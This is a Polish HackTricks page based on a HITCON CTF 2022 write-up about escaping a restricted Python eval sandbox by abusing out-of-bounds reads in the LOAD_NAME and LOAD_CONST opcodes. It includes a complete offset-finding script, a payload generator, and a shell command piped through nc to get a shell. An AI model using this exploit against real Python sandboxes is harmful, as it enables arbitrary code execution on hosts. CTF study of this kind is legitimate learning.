# LOAD_NAME / LOAD_CONST opcode OOB Read

{% hint style="success" %}
Naucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostępniaj sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}

**Te informacje zostały zaczerpnięte** [**z tego opisu**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Możemy wykorzystać funkcję OOB read w operacjach LOAD_NAME / LOAD_CONST, aby uzyskać pewien symbol w pamięci. Oznacza to wykorzystanie sztuczki takiej jak `(a, b, c, ... setki symboli ..., __getattribute__) if [] else [].__getattribute__(...)` aby uzyskać symbol (takie jak nazwa funkcji), którego chcesz.

Następnie wystarczy opracować swój exploit.

### Przegląd <a href="#overview-1" id="overview-1"></a>

Kod źródłowy jest dość krótki, zawiera tylko 4 linie!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Możesz wprowadzić dowolny kod Pythona, a zostanie on skompilowany do [obiektu kodu Pythona](https://docs.python.org/3/c-api/code.html). Jednak `co_consts` i `co_names` tego obiektu kodu zostaną zastąpione pustym krotką przed ewaluacją tego obiektu kodu.

W ten sposób wszystkie wyrażenia zawierające stałe (np. liczby, ciągi znaków itp.) lub nazwy (np. zmienne, funkcje) mogą spowodować błąd segmentacji na końcu.

### Odczyt poza zakresem <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Jak dochodzi do błędu segmentacji?

Zacznijmy od prostego przykładu, `[a, b, c]` może zostać skompilowane do następującego kodu bajtowego.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Ale co jeśli `co_names` stanie się pustym krotką? Opcodes `LOAD_NAME 2` i tak są wykonywane, próbując odczytać wartość z tego adresu pamięci, z którego początkowo powinna pochodzić. Tak, to funkcja odczytu spoza zakresu.

Podstawowa koncepcja rozwiązania jest prosta. Niektóre operacje w CPython, na przykład `LOAD_NAME` i `LOAD_CONST`, są podatne (?) na odczyt spoza zakresu.

Pobierają one obiekt z indeksu `oparg` z krotki `consts` lub `names` (tak są nazwane `co_consts` i `co_names` pod spodem). Możemy odnieść się do poniższego krótkiego fragmentu dotyczącego `LOAD_CONST`, aby zobaczyć, co robi CPython podczas przetwarzania operacji `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
W ten sposób możemy użyć funkcji OOB, aby uzyskać "nazwę" z dowolnego przesunięcia pamięci. Aby upewnić się, jaką nazwę ma i jakie ma przesunięcie, wystarczy próbować `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... I możesz znaleźć coś w okolicach oparg > 700. Możesz także spróbować użyć gdb, aby przyjrzeć się układowi pamięci oczywiście, ale nie sądzę, że byłoby to łatwiejsze?

### Generowanie ataku <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Gdy już pozyskamy te przydatne przesunięcia dla nazw / stałych, jak _uzyskać_ nazwę / stałą z tego przesunięcia i jej użyć? Oto sztuczka dla Ciebie:\
Załóżmy, że możemy uzyskać nazwę `__getattribute__` z przesunięcia 5 (`LOAD_NAME 5`) z `co_names=()`, wtedy po prostu wykonaj następujące czynności:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Zauważ, że nie jest konieczne nazwanie tego jako `__getattribute__`, możesz nazwać to jako coś krótszego lub bardziej dziwnego

Możesz zrozumieć powód po prostu przeglądając jego bytecode:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Zauważ, że `LOAD_ATTR` również pobiera nazwę z `co_names`. Python ładuje nazwy z tego samego przesunięcia, jeśli nazwa jest taka sama, dlatego drugie `__getattribute__` jest nadal ładowane z przesunięcia=5. Korzystając z tej funkcji, możemy użyć dowolnej nazwy, gdy nazwa jest w pamięci w pobliżu.

Generowanie liczb powinno być trywialne:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Skrypt Wykorzystania <a href="#exploit-script-1" id="exploit-script-1"></a>

Nie użyłem stałych ze względu na limit długości.

Najpierw oto skrypt, który pozwala nam znaleźć te przesunięcia nazw.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
I poniżej znajduje się kod generujący rzeczywisty exploit w Pythonie.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
To po prostu wykonuje następujące czynności dla tych ciągów, które otrzymujemy z metody `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
Ucz się i praktykuj Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i praktykuj Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostępniaj sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
